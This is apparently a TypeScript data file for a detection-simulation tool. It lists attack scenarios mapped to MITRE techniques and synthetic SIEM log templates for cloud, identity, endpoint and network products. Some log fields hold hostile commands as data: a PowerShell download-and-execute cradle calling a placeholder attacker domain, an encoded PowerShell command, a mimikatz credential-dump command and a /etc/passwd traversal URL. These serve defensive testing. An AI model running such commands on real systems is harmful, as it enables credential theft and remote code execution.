import type { Detection, Domain, Story } from './types';

const randomInt = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;

export const DOMAINS: Domain[] = ["Network", "Identity", "Cloud", "Endpoint", "Email"];

export const STORIES: Story[] = [
    { "id": "story_01", "name": "Spearphishing Leads to Cloud Compromise", "description": "An attacker sends a targeted spearphishing email to JBorn containing a link to a credential harvesting page. JBorn, on workstation The-Boss (10.2.0.44), enters their corporate credentials. The attacker, from {attacker_ip}, immediately uses these credentials to successfully log into the corporate VPN. Once on the network, the attacker remotely executes a PowerShell command on JBorn's workstation to download mimikatz from their C2 server. Cortex XDR detects the subsequent attempt to dump credentials from LSASS. Using credentials found in memory, the attacker accesses an AWS S3 bucket and makes it public to exfiltrate sensitive financial data. The large data upload is detected by the Palo Alto Networks firewall as it leaves the network.", "actors": ["victim_user", "attacker_ip", "victim_ip", "attacker_domain", "hostname", "file_name", "db_name"], "stages": [ { "name": "Spearphishing Email Delivery", "domain": "Email", "techniqueId": "T1566" }, { "name": "Successful VPN Login with Stolen Credentials", "domain": "Identity", "techniqueId": "T1078" }, { "name": "PowerShell for Tool Download", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Credential Dumping from LSASS", "domain": "Endpoint", "techniqueId": "T1003" }, { "name": "Public S3 Bucket Exposure", "domain": "Cloud", "techniqueId": "T1530" }, { "name": "Exfiltration of Financial Data", "domain": "Network", "techniqueId": "T1567" } ] },
    { "id": "story_02", "name": "Cloud Account Takeover & Persistence", "description": "Using credentials for HReed obtained from a dark web marketplace, an attacker logs into a cloud account and creates a new IAM user for persistence. They then pivot to HReed's workstation, SOC-Tech (10.2.0.45), executing PowerShell commands to download additional tools and exfiltrate data over a C2 channel.", "actors": ["victim_user", "attacker_ip", "hostname", "attacker_domain"], "stages": [ { "name": "Cloud Account Login", "domain": "Identity", "techniqueId": "T1078" }, { "name": "Create Cloud IAM User", "domain": "Cloud", "techniqueId": "T1098" }, { "name": "PowerShell Execution on Endpoint", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Ingress Tool Transfer", "domain": "Endpoint", "techniqueId": "T1105" }, { "name": "Exfiltration Over C2 Channel", "domain": "Network", "techniqueId": "T1071" } ] },
    { "id": "story_03", "name": "Malicious OAuth Application", "description": "An attacker tricks RRios on workstation SOC-Eng (10.2.0.46) into granting consent to a malicious OAuth application delivered via a phishing email. This application provides persistent access, allowing the attacker to manipulate RRios's cloud account and exfiltrate data.", "actors": ["victim_user", "attacker_ip", "hostname", "attacker_domain"], "stages": [ { "name": "Initial Phishing Email", "domain": "Email", "techniqueId": "T1566" }, { "name": "Malicious Application Consent", "domain": "Identity", "techniqueId": "T1557" }, { "name": "PowerShell Execution", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Cloud Account Manipulation", "domain": "Cloud", "techniqueId": "T1098" }, { "name": "Exfiltration via Web Service", "domain": "Network", "techniqueId": "T1567" } ] },
    { "id": "story_04", "name": "Insider Threat Data Hoarding", "description": "Insider threat JBorn uses PowerShell on their machine, The-Boss (10.2.0.44), to aggregate and stage sensitive data from the Windows file server (10.3.0.44). JBorn then transfers exfiltration tools and uploads the stolen data to a personal cloud storage account.", "actors": ["victim_user", "victim_ip", "hostname", "attacker_domain"], "stages": [ { "name": "PowerShell Execution for Staging", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Tool Transfer to Endpoint", "domain": "Endpoint", "techniqueId": "T1105" }, { "name": "Cloud Account Manipulation", "domain": "Identity", "techniqueId": "T1098" }, { "name": "Cloud Persistence", "domain": "Cloud", "techniqueId": "T1098" }, { "name": "Exfiltration to Cloud Storage", "domain": "Network", "techniqueId": "T1567" } ] },
    { "id": "story_05", "name": "Container Escape to Lateral Movement", "description": "After HReed clicks a phishing link, an attacker compromises a web application on an Ubuntu server (10.3.0.45). They exploit a vulnerability to escape the container, execute commands via WMI on the host, and then move laterally to another internal host (10.2.0.47) using valid accounts.", "actors": ["victim_user", "attacker_ip", "victim_ip", "hostname"], "stages": [ { "name": "Initial Phishing Email", "domain": "Email", "techniqueId": "T1566" }, { "name": "Escape to Host from Container", "domain": "Cloud", "techniqueId": "T1611" }, { "name": "Execution via WMI", "domain": "Endpoint", "techniqueId": "T1047" }, { "name": "Lateral Movement via Valid Accounts", "domain": "Identity", "techniqueId": "T1078" }, { "name": "C2 Communication", "domain": "Network", "techniqueId": "T1071" } ] },
    { "id": "story_06", "name": "MFA Fatigue Attack", "description": "An attacker with RRios's credentials initiates an MFA fatigue attack, spamming push notifications until one is mistakenly approved. Once in, they execute malicious scripts on RRios's workstation, SOC-Eng (10.2.0.46), to download tools and establish C2 communication.", "actors": ["victim_user", "attacker_ip", "hostname", "attacker_domain"], "stages": [ { "name": "Repeated Login Attempts", "domain": "Identity", "techniqueId": "T1078" }, { "name": "Successful Cloud Login", "domain": "Cloud", "techniqueId": "T1078" }, { "name": "Malicious Script Execution", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Tool Downloaded to Endpoint", "domain": "Endpoint", "techniqueId": "T1105" }, { "name": "C2 Communication Established", "domain": "Network", "techniqueId": "T1071" } ] },
    { "id": "story_07", "name": "Hybrid Cloud Compromise", "description": "An attacker targets JBorn on workstation The-Boss (10.2.0.44) with a phishing email to compromise their on-premise account in the byos.local domain. Using this foothold, the attacker pivots to the cloud, manipulating resources and exfiltrating data.", "actors": ["victim_user", "attacker_ip", "hostname", "hostname_domain"], "stages": [ { "name": "Initial Phishing Email", "domain": "Email", "techniqueId": "T1566" }, { "name": "On-Premise Account Manipulation", "domain": "Identity", "techniqueId": "T1098" }, { "name": "Cloud Resource Manipulation", "domain": "Cloud", "techniqueId": "T1098" }, { "name": "PowerShell Execution", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Data Exfiltration Over Web Service", "domain": "Network", "techniqueId": "T1567" } ] },
    { "id": "story_08", "name": "Credential Stuffing & Account Takeover", "description": "An attacker successfully uses credential stuffing to gain access as HReed to a cloud service. They then pivot to a compromised internal endpoint (10.2.0.47), dump credentials to escalate privileges, and exfiltrate data over a C2 channel. HReed's primary workstation is SOC-Tech (10.2.0.45).", "actors": ["victim_user", "attacker_ip", "hostname", "attacker_domain"], "stages": [ { "name": "Cloud Login with Valid Account", "domain": "Cloud", "techniqueId": "T1078" }, { "name": "Identity Login with Valid Account", "domain": "Identity", "techniqueId": "T1078" }, { "name": "OS Credential Dumping", "domain": "Endpoint", "techniqueId": "T1003" }, { "name": "Ingress Tool Transfer", "domain": "Endpoint", "techniqueId": "T1105" }, { "name": "Exfiltration Over C2 Channel", "domain": "Network", "techniqueId": "T1071" } ] },
    { "id": "story_09", "name": "Suspicious SharePoint Activity", "description": "Using a compromised identity for RRios, an attacker accesses SharePoint and downloads a large volume of sensitive files. They then use PowerShell on RRios's workstation, SOC-Eng (10.2.0.46), to stage the data before establishing persistence and exfiltrating it.", "actors": ["victim_user", "victim_ip", "hostname", "attacker_domain"], "stages": [ { "name": "Identity Login with Valid Account", "domain": "Identity", "techniqueId": "T1078" }, { "name": "Mass File Download from Cloud", "domain": "Cloud", "techniqueId": "T1105" }, { "name": "PowerShell for Data Staging", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Cloud Account Persistence", "domain": "Cloud", "techniqueId": "T1098" }, { "name": "Data Exfiltration via Web Service", "domain": "Network", "techniqueId": "T1567" } ] },
    { "id": "story_10", "name": "Living off the Land", "description": "A 'living off the land' attack starts with a phishing email to JBorn. The adversary uses built-in tools like PowerShell on JBorn's workstation, The-Boss (10.2.0.44), within the byos.local domain, to achieve stealthy execution and persistence across identity and cloud platforms.", "actors": ["victim_user", "attacker_ip", "hostname", "hostname_domain"], "stages": [ { "name": "Initial Phishing Email", "domain": "Email", "techniqueId": "T1566" }, { "name": "PowerShell Execution", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Identity Persistence", "domain": "Identity", "techniqueId": "T1098" }, { "name": "Cloud Persistence", "domain": "Cloud", "techniqueId": "T1098" }, { "name": "C2 Communication via Standard Protocol", "domain": "Network", "techniqueId": "T1071" } ] },
    { "id": "story_11", "name": "Ransomware via Exposed RDP", "description": "An attacker finds an exposed RDP service on the Windows file server (10.3.0.44) and successfully brute-forces HReed's credentials. After gaining access, they dump other credentials for lateral movement and deploy ransomware to encrypt server files.", "actors": ["attacker_ip", "victim_ip", "hostname", "file_name"], "stages": [ { "name": "Login via RDP", "domain": "Identity", "techniqueId": "T1078" }, { "name": "Malicious Script Execution", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "OS Credential Dumping", "domain": "Endpoint", "techniqueId": "T1003" }, { "name": "C2 Communication", "domain": "Network", "techniqueId": "T1071" }, { "name": "Data Encrypted for Impact", "domain": "Endpoint", "techniqueId": "T1486" } ] },
    { "id": "story_12", "name": "Business Email Compromise", "description": "Via a phishing attack on JBorn's workstation, The-Boss (10.2.0.44), an attacker gains access to their email account. They create a new account for persistence and set up inbox rules to facilitate a business email compromise (BEC) attack, attempting fraudulent wire transfers.", "actors": ["victim_user", "attacker_ip", "attacker_domain", "hostname"], "stages": [ { "name": "Initial Phishing Email", "domain": "Email", "techniqueId": "T1566" }, { "name": "Email Account Login", "domain": "Identity", "techniqueId": "T1078" }, { "name": "Identity Persistence", "domain": "Identity", "techniqueId": "T1098" }, { "name": "Inbox Rule Creation", "domain": "Email", "techniqueId": "T1114" }, { "name": "Data Exfiltration Attempt", "domain": "Network", "techniqueId": "T1567" } ] },
    { "id": "story_13", "name": "Malicious Macro Execution", "description": "HReed opens a malicious document on workstation SOC-Tech (10.2.0.45), executing a macro that uses WMI for local command execution. The attacker then establishes a C2 channel and attempts to move laterally using compromised accounts.", "actors": ["victim_user", "victim_ip", "attacker_ip", "hostname"], "stages": [ { "name": "Phishing Email with Malicious Doc", "domain": "Email", "techniqueId": "T1566" }, { "name": "Script Execution via Macro", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Execution via WMI", "domain": "Endpoint", "techniqueId": "T1047" }, { "name": "C2 Beaconing", "domain": "Network", "techniqueId": "T1071" }, { "name": "Attempted Lateral Movement", "domain": "Identity", "techniqueId": "T1078" } ] },
    { "id": "story_14", "name": "Cloud Infrastructure Attack", "description": "Targeting the cloud directly, an attacker uses RRios's compromised credentials to log in. They create a new IAM user, escape a container on the Ubuntu web server (10.3.0.45), and use the underlying host to establish a C2 channel for data exfiltration. RRios's workstation is SOC-Eng (10.2.0.46).", "actors": ["attacker_ip", "victim_user", "hostname", "app_name"], "stages": [ { "name": "Cloud Account Login", "domain": "Cloud", "techniqueId": "T1078" }, { "name": "Cloud IAM User Creation", "domain": "Cloud", "techniqueId": "T1098" }, { "name": "Escape to Host from Container", "domain": "Cloud", "techniqueId": "T1611" }, { "name": "PowerShell on Host", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "C2 Communication from Cloud", "domain": "Network", "techniqueId": "T1071" } ] },
    { "id": "story_15", "name": "Credential Access & Multi-Cloud Pivot", "description": "After a successful phishing attack on JBorn, an attacker dumps credentials from the endpoint The-Boss (10.2.0.44). The stolen credentials provide access to multiple cloud environments, allowing the adversary to pivot between them before exfiltrating data.", "actors": ["victim_user", "attacker_ip", "victim_ip", "attacker_domain", "hostname"], "stages": [ { "name": "Initial Phishing Email", "domain": "Email", "techniqueId": "T1566" }, { "name": "Credential Dumping from Endpoint", "domain": "Endpoint", "techniqueId": "T1003" }, { "name": "Identity Login (Cloud 1)", "domain": "Identity", "techniqueId": "T1078" }, { "name": "Cloud Login (Cloud 2)", "domain": "Cloud", "techniqueId": "T1078" }, { "name": "Exfiltration from Cloud", "domain": "Network", "techniqueId": "T1567" } ] },
    { "id": "story_16", "name": "Kerberos-based AD Compromise", "description": "Within the byos.local domain, an attacker compromises HReed's workstation, SOC-Tech (10.2.0.45), via phishing. After dumping credentials, they perform a Kerberoasting attack against the Domain Controller (BYOS-DC-A, 10.1.0.20) to gain administrative access and discover high-privilege accounts.", "actors": ["victim_user", "victim_ip", "hostname", "hostname_domain"], "stages": [ { "name": "Initial Phishing Email", "domain": "Email", "techniqueId": "T1566" }, { "name": "Credential Dumping", "domain": "Endpoint", "techniqueId": "T1003" }, { "name": "Kerberoasting Attack", "domain": "Identity", "techniqueId": "T1558" }, { "name": "Domain Account Discovery", "domain": "Identity", "techniqueId": "T1087" }, { "name": "C2 Communication", "domain": "Network", "techniqueId": "T1071" } ] },
    { "id": "story_17", "name": "Ransomware Attack", "description": "A ransomware attack is initiated with a phishing email to RRios. This results in malicious script execution on their workstation, SOC-Eng (10.2.0.46), followed by credential dumping for lateral movement, and finally, the encryption of local files for impact.", "actors": ["victim_user", "attacker_ip", "hostname", "file_name"], "stages": [ { "name": "Initial Phishing Email", "domain": "Email", "techniqueId": "T1566" }, { "name": "Malicious Script Execution", "domain": "Endpoint", "techniqueId": "T1059" }, { "name": "Credential Dumping", "domain": "Endpoint", "techniqueId": "T1003" }, { "name": "Tool Transfer", "domain": "Network", "techniqueId": "T1105" }, { "name": "Ransomware Execution (File Encryption)", "domain": "Endpoint", "techniqueId": "T1486" } ] }
];

export const DETECTIONS_LIBRARY: Detection[] = [
    { "id": "aws_cloudtrail_001", "name": "AWS CloudTrail - CreateUser", "tactic": "TA0003 - Persistence", "mitre_technique": "T1098", "dataSource": "AWS CloudTrail", "productType": "AWS", "domain": "Cloud", "simulation": { "type": "single", "generator": "gen_aws_cloudtrail_log", "params": { "name": "CreateUser", "eventSource": "iam.amazonaws.com", "eventName": "CreateUser", "awsRegion": "{random_choice:us-east-1,us-west-2}", "sourceIPAddress": "{attacker_ip}", "userAgent": "AWS CLI/2.13.0", "requestParameters_userName": "{user_name}" } } },
    { "id": "aws_cloudtrail_002", "name": "AWS CloudTrail - ConsoleLogin without MFA", "tactic": "TA0001 - Initial Access", "mitre_technique": "T1078", "dataSource": "AWS CloudTrail", "productType": "AWS", "domain": "Cloud", "simulation": { "type": "single", "generator": "gen_aws_cloudtrail_log", "params": { "name": "ConsoleLogin", "eventSource": "signin.amazonaws.com", "eventName": "ConsoleLogin", "awsRegion": "us-east-1", "sourceIPAddress": "{attacker_ip}", "userAgent": "Mozilla/5.0", "responseElements_ConsoleLogin": "Failure", "additionalEventData_MFAUsed": "No" } } },
    { "id": "aws_cloudtrail_003", "name": "AWS CloudTrail - S3 Bucket Policy Made Public", "tactic": "TA0005 - Defense Evasion", "mitre_technique": "T1530", "dataSource": "AWS CloudTrail", "productType": "AWS", "domain": "Cloud", "simulation": { "type": "single", "generator": "gen_aws_cloudtrail_log", "params": { "name": "PutBucketPolicy", "eventSource": "s3.amazonaws.com", "eventName": "PutBucketPolicy", "awsRegion": "us-east-1", "sourceIPAddress": "{attacker_ip}", "userAgent": "AWS CLI/2.13.0", "requestParameters_bucketName": "{db_name}", "requestParameters_policy": "{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Sid\\\":\\\"PublicReadGetObject\\\",\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":\\\"*\\\",\\\"Action\\\":\\\"s3:GetObject\\\",\\\"Resource\\\":\\\"arn:aws:s3:::{db_name}/*\\\"}]}" } } },
    { "id": "gcp_audit_001", "name": "GCP - IAM Policy Grant on Service Account", "tactic": "TA0003 - Persistence", "mitre_technique": "T1098", "dataSource": "GCP Audit Log", "productType": "GCP", "domain": "Cloud", "simulation": { "type": "single", "generator": "gen_gcp_audit_log", "params": { "principalEmail": "{attacker_ip}@evil-corp.com", "methodName": "google.iam.admin.v1.SetIAMPolicy", "serviceName": "iam.googleapis.com", "resourceName": "projects/{hostname_domain}/serviceAccounts/{app_name}@{hostname_domain}.iam.gserviceaccount.com", "role": "roles/owner", "member": "user:{victim_user}@apexfin.local" } } },
    { "id": "azure_activity_001", "name": "Azure - Public IP Assigned to VM", "tactic": "TA0010 - Exfiltration", "mitre_technique": "T1567", "dataSource": "Azure Activity Log", "productType": "Azure", "domain": "Cloud", "simulation": { "type": "single", "generator": "gen_azure_activity_log", "params": { "operationName": "Microsoft.Network/networkInterfaces/write", "caller": "{victim_user}@{hostname_domain}", "resourceGroupName": "PROD-RG", "resourceProvider": "Microsoft.Network", "resourceType": "networkInterfaces", "resourceName": "{hostname}-nic-1", "subscriptionId": "a1b2c3d4-e5f6-g7h8-i9j0-k1l2m3n4o5p6" } } },
    { "id": "mde_001", "name": "MDE - PowerShell Execution", "tactic": "TA0002 - Execution", "mitre_technique": "T1059.001", "dataSource": "Microsoft Defender for Endpoint", "productType": "MDE", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_mde_log", "params": { "name": "Suspicious PowerShell Command", "FileName": "powershell.exe", "ProcessCommandLine": "powershell -enc IABJAEUAVgAgACgATgBIAHcALQBPAGIAagBIAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBIAHQALgBXAGUAYgBDAGwAaQBIAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHsAYQBOAHQAYQBjAGsAZQByAF8AZABvAG0AYQBpAG4ALwBpAG4AdgBvAGsAZQAnACkA", "InitiatingProcessFileName": "cmd.exe", "DeviceName": "{victim_hostname}", "victim_user": "{victim_user}", "hostname_domain": "{hostname_domain}" } } },
    { "id": "crowdstrike_001", "name": "CrowdStrike - Process Spawned by LSASS", "tactic": "TA0006 - Credential Access", "mitre_technique": "T1003.001", "dataSource": "CrowdStrike Falcon", "productType": "CrowdStrike", "domain": "Endpoint", "simulation": { "type": "single", "generator": "generic_cef", "params": { "name": "LsassProcessAccess", "ParentProcessName": "lsass.exe", "ProcessName": "{file_name}", "CommandLine": "{file_name} sekurlsa::logonpasswords", "ComputerName": "{victim_hostname}", "UserName": "{user_name}" } } },
    { "id": "crowdstrike_002", "name": "CrowdStrike - Suspicious PowerShell Command", "tactic": "TA0002 - Execution", "mitre_technique": "T1059.001", "dataSource": "CrowdStrike Falcon", "productType": "CrowdStrike", "domain": "Endpoint", "simulation": { "type": "single", "generator": "generic_cef", "params": { "name": "PowerShell LOLBAS Execution", "ParentProcessName": "explorer.exe", "ProcessName": "powershell.exe", "CommandLine": "powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://{attacker_domain}/payload.ps1'))\"", "ComputerName": "{victim_hostname}", "UserName": "{victim_user}" } } },
    { "id": "okta_001", "name": "Okta - Successful Login from New Country", "tactic": "TA0001 - Initial Access", "mitre_technique": "T1078", "dataSource": "Okta SSO", "productType": "Okta", "domain": "Identity", "simulation": { "type": "single", "generator": "generic_cef", "params": { "name": "user.session.start", "outcome_result": "SUCCESS", "actor_displayName": "{user_name}", "client_ipAddress": "{attacker_ip}", "client_geographicalContext_country": "RU", "securityContext_isMfaRequired": "true" } } },
    { "id": "okta_002", "name": "Okta - Failed Login from Suspicious Location", "tactic": "TA0001 - Initial Access", "mitre_technique": "T1078", "dataSource": "Okta SSO", "productType": "Okta", "domain": "Identity", "simulation": { "type": "single", "generator": "generic_cef", "params": { "name": "user.session.start", "outcome_result": "FAILURE", "outcome_reason": "INVALID_CREDENTIALS", "actor_displayName": "{victim_user}", "client_ipAddress": "{attacker_ip}", "client_geographicalContext_country": "KP", "securityContext_isMfaRequired": "false" } } },
    { "id": "azure_ad_001", "name": "Azure AD - New App Consent Granted", "tactic": "TA0003 - Persistence", "mitre_technique": "T1557", "dataSource": "Azure AD Audit", "productType": "Azure", "domain": "Identity", "simulation": { "type": "single", "generator": "gen_azure_ad_audit_log", "params": { "name": "Consent to application", "operationName": "Consent to application", "result": "success", "initiatedBy_user_userPrincipalName": "{user_name}@{hostname}", "targetResources_0_displayName": "Malicious App", "targetResources_0_modifiedProperties_0_displayName": "Permission.Grant" } } },
    { "id": "azure_ad_002", "name": "Azure AD - User added to Global Administrator role", "tactic": "TA0004 - Privilege Escalation", "mitre_technique": "T1098", "dataSource": "Azure AD Audit", "productType": "Azure", "domain": "Identity", "simulation": { "type": "single", "generator": "gen_azure_ad_audit_log", "params": { "name": "Add member to role", "operationName": "Add member to role", "result": "success", "initiatedBy_user_userPrincipalName": "{user_name}@{hostname}", "targetResources_0_displayName": "Global Administrator" } } },
    { "id": "azure_signin_001", "name": "Azure Sign-in from Anonymous IP", "tactic": "TA0001 - Initial Access", "mitre_technique": "T1078", "dataSource": "Azure Sign-in", "productType": "Azure", "domain": "Identity", "simulation": { "type": "single", "generator": "gen_azure_signin_log", "params": { "name": "Risky sign-in detected", "operationName": "Sign-in activity", "resultType": "0", "riskDetail": "anonymousIpAddress", "riskLevelAggregated": "medium", "userPrincipalName": "{user_name}@{hostname}", "ipAddress": "{attacker_ip}", "location_city": "Unknown", "location_countryOrRegion": "Unknown" } } },
    { "id": "mdi_001", "name": "MDI - Suspected Golden Ticket usage", "tactic": "TA0006 - Credential Access", "mitre_technique": "T1558.001", "dataSource": "Microsoft Defender for Identity", "productType": "MDI", "domain": "Identity", "simulation": { "type": "single", "generator": "gen_defender_for_identity_log", "params": { "name": "Suspected Golden Ticket usage (encryption downgrade)", "signatureId": "2031", "severity": "10", "dvchost": "{victim_hostname}", "suser": "{victim_user}", "duser": "{victim_user}", "dntdom": "{hostname_domain}", "destinationServiceName": "krbtgt/{hostname_domain}", "proto": "Kerberos" } } },
    { "id": "mdi_002", "name": "MDI - Security principal reconnaissance (LDAP)", "tactic": "TA0007 - Discovery", "mitre_technique": "T1087.002", "dataSource": "Microsoft Defender for Identity", "productType": "MDI", "domain": "Identity", "simulation": { "type": "single", "generator": "gen_defender_for_identity_log", "params": { "name": "Security principal reconnaissance (LDAP)", "signatureId": "2003", "severity": "5", "dvchost": "{victim_hostname}", "shost": "{victim_ip}", "suser": "{victim_user}", "duser": "SAMR", "dntdom": "{hostname_domain}", "proto": "LDAP" } } },
    { "id": "panos_001", "name": "PAN-OS - C2 Beaconing Detected", "tactic": "TA0011 - Command and Control", "mitre_technique": "T1071.001", "dataSource": "Palo Alto Networks PAN-OS", "productType": "PAN-OS", "domain": "Network", "simulation": { "type": "loop", "count": 10, "generator": "gen_panos_log", "params": { "log_type": "TRAFFIC", "src": "{victim_ip}", "dst": "{attacker_ip}", "spt": "{victim_port}", "dpt": "{attacker_port}", "app": "ssl", "action": "allow", "category": "command-and-control", "user": "{victim_user}" } } },
    { "id": "panos_002", "name": "PAN-OS - Command Injection Vulnerability Detected", "tactic": "TA0001 - Initial Access", "mitre_technique": "T1190", "dataSource": "Palo Alto Networks PAN-OS", "productType": "PAN-OS", "domain": "Network", "simulation": { "type": "single", "generator": "gen_panos_log", "params": { "log_type": "THREAT", "subtype": "vulnerability", "src": "{attacker_ip}", "dst": "{victim_ip}", "spt": "{attacker_port}", "dpt": "80", "action": "alerted", "threat_name": "PHP Command Injection Vulnerability", "threat_id": "91337", "severity": "critical", "category": "code-execution", "url": "http://{victim_ip}/?page=.../etc/passwd", "user": "n/a" } } },
    { "id": "panos_003", "name": "PAN-OS - Large Upload to High-Risk Category", "tactic": "TA0010 - Exfiltration", "mitre_technique": "T1567.002", "dataSource": "Palo Alto Networks PAN-OS", "productType": "PAN-OS", "domain": "Network", "simulation": { "type": "single", "generator": "gen_panos_log", "params": { "log_type": "TRAFFIC", "src": "{victim_ip}", "dst": "{attacker_ip}", "spt": "{victim_port}", "dpt": "443", "app": "ssl", "action": "allow", "category": "file-sharing", "user": "{victim_user}", "bytes_sent": "{random_int:5000000,15000000}", "bytes_received": "{random_int:100,1000}" } } },
    { "id": "panos_004", "name": "PAN-OS - Malicious File Downloaded", "tactic": "TA0011 - Command and Control", "mitre_technique": "T1105", "dataSource": "Palo Alto Networks PAN-OS", "productType": "PAN-OS", "domain": "Network", "simulation": { "type": "single", "generator": "gen_panos_log", "params": { "log_type": "THREAT", "subtype": "file", "src": "{attacker_ip}", "dst": "{victim_ip}", "spt": "{attacker_port}", "dpt": "{victim_port}", "action": "alerted", "threat_name": "Generic Malware Download", "threat_id": "99998", "severity": "high", "category": "malware-download", "url": "http://{attacker_domain}/{file_name}", "user": "{victim_user}" } } },
    { "id": "cisco_asa_001", "name": "Cisco ASA - Outbound Connection to C2 Server", "tactic": "TA0011 - Command and Control", "mitre_technique": "T1071.001", "dataSource": "Cisco ASA Firewall", "productType": "Cisco ASA", "domain": "Network", "simulation": { "type": "loop", "count": 10, "generator": "gen_cisco_asa_log", "params": { "src_ip": "{victim_ip}", "dest_ip": "{attacker_ip}", "dest_port": "{attacker_port}", "protocol": "TCP" } } },
    { "id": "fortinet_fg_001", "name": "FortiGate - Web Filter Block - Malicious Category", "tactic": "TA0011 - Command and Control", "mitre_technique": "T1071.001", "dataSource": "Fortinet FortiGate", "productType": "Fortinet", "domain": "Network", "simulation": { "type": "single", "generator": "gen_fortinet_fortigate_log", "params": { "src_ip": "{victim_ip}", "dest_ip": "{attacker_ip}", "dest_port": "443", "user": "{victim_user}", "hostname": "{attacker_domain}", "action": "blocked", "catdesc": "Malicious Websites", "url": "https://{attacker_domain}/beacon" } } },
    { "id": "fortinet_fg_002", "name": "FortiGate - High Volume Upload to File Sharing Site", "tactic": "TA0010 - Exfiltration", "mitre_technique": "T1567.002", "dataSource": "Fortinet FortiGate", "productType": "Fortinet", "domain": "Network", "simulation": { "type": "single", "generator": "gen_fortinet_fortigate_log", "params": { "src_ip": "{victim_ip}", "dest_ip": "{attacker_ip}", "dest_port": "443", "user": "{victim_user}", "hostname": "{attacker_domain}", "action": "passthrough", "catdesc": "File Sharing", "url": "https://{attacker_domain}/upload", "sentbyte": "{random_int:5000000,15000000}", "rcvdbyte": "{random_int:100,1000}", "msg": "Traffic passed." } } },
    { "id": "zscaler_001", "name": "Zscaler - Data Exfiltration to Unsanctioned Site", "tactic": "TA0010 - Exfiltration", "mitre_technique": "T1567.002", "dataSource": "Zscaler Web Proxy", "productType": "Zscaler", "domain": "Network", "simulation": { "type": "single", "generator": "gen_zscaler_log", "params": { "name": "Web Traffic", "user": "{user_name}", "source_ip": "{victim_ip}", "dest_ip": "{attacker_ip}", "url_category": "File Sharing", "url": "https://{attacker_domain}/upload.php", "total_bytes": "{random_int:500,1500}", "sent_bytes": "{random_int:5000000,15000000}", "action": "allowed", "httpMethod": "POST", "threat_category": "Data Leakage", "threat_class": "Suspicious Destination" } } },
    { "id": "meraki_001", "name": "Meraki - Malicious File Download Detected (ET POLICY)", "tactic": "TA0011 - Command and Control", "mitre_technique": "T1105", "dataSource": "Cisco Meraki IDS", "productType": "Meraki", "domain": "Network", "simulation": { "type": "single", "generator": "gen_meraki_ids_alert_log", "params": { "name": "Malicious File Download", "signature": "1:2010935:6", "priority": "1", "classification": "Potentially Bad Traffic", "direction": "ingress", "src_ip": "{attacker_ip}", "src_port": "80", "dst_ip": "{victim_ip}", "dst_port": "{victim_port}", "message": "ET POLICY PE EXE or DLL Windows file download HTTP for url {attacker_domain}/{file_name}" } } },
    { "id": "proofpoint_001", "name": "Proofpoint - Malicious URL Clicked", "tactic": "TA0001 - Initial Access", "mitre_technique": "T1566.002", "dataSource": "Proofpoint TAP", "productType": "Proofpoint", "domain": "Email", "simulation": { "type": "single", "generator": "generic_cef", "params": { "name": "TAP Blocked Click", "subject": "{email_subject}", "recipient": "{user_name}@example.com", "sender": "evil@{attacker_domain}", "threatStatus": "active", "clicked": "true", "blocked": "true", "url": "http://phish.{attacker_domain}/{file_name}" } } },
    { "id": "m365_001", "name": "M365 - Anonymous Sharing Link Created", "tactic": "TA0009 - Collection", "mitre_technique": "T1105", "dataSource": "Microsoft 365", "productType": "M365", "domain": "Cloud", "simulation": { "type": "single", "generator": "gen_m365_audit_log", "params": { "name": "SharingSet", "Operation": "SharingSet", "UserId": "{victim_user}", "ClientIP": "{victim_ip}", "ObjectId": "SharePoint.File", "SharingType": "Anonymous", "SiteUrl": "https://apexfin.sharepoint.com/sites/Finance/Shared%20Documents/Q3_Earnings_Report.docx" } } },
    { "id": "m365_002", "name": "M365 - Inbox Forwarding Rule Created", "tactic": "TA0009 - Collection", "mitre_technique": "T1114.003", "dataSource": "Microsoft 365", "productType": "M365", "domain": "Email", "simulation": { "type": "single", "generator": "gen_m365_audit_log", "params": { "name": "Set-Mailbox auto-forwarding rule", "Operation": "Set-Mailbox", "UserId": "{victim_user}", "ClientIP": "{attacker_ip}", "Parameters": [ { "Name": "DeliverToMailboxAndForward", "Value": "True" }, { "Name": "ForwardingSmtpAddress", "Value": "attacker@{attacker_domain}" } ] } } },
    { "id": "m365_003", "name": "M365 - Malicious URL click detected by Safe Links", "tactic": "TA0001 - Initial Access", "mitre_technique": "T1566.002", "dataSource": "Microsoft 365", "productType": "M365", "domain": "Email", "simulation": { "type": "single", "generator": "gen_m365_audit_log", "params": { "name": "SafeLinks URL Click", "Operation": "SafeLinksUrlClicked", "UserId": "{victim_user}", "ClientIP": "{victim_ip}", "Url": "http://phish.{attacker_domain}/{file_name}", "Action": "Block" } } },
    { "id": "k8s_001", "name": "Kubernetes - Pod Created with Host PID Access", "tactic": "TA0004 - Privilege Escalation", "mitre_technique": "T1611", "dataSource": "Kubernetes Audit", "productType": "Kubernetes", "domain": "Cloud", "simulation": { "type": "single", "generator": "gen_kubernetes_audit_log", "params": { "name": "Pod Create", "verb": "create", "resource": "pods", "namespace": "default", "requestURI": "/api/v1/namespaces/default/pods", "user_username": "system:serviceaccount:kube-system:replicaset-controller", "objectRef_name": "malicious-pod", "responseStatus_code": "201", "object_spec_hostPID": "true" } } },
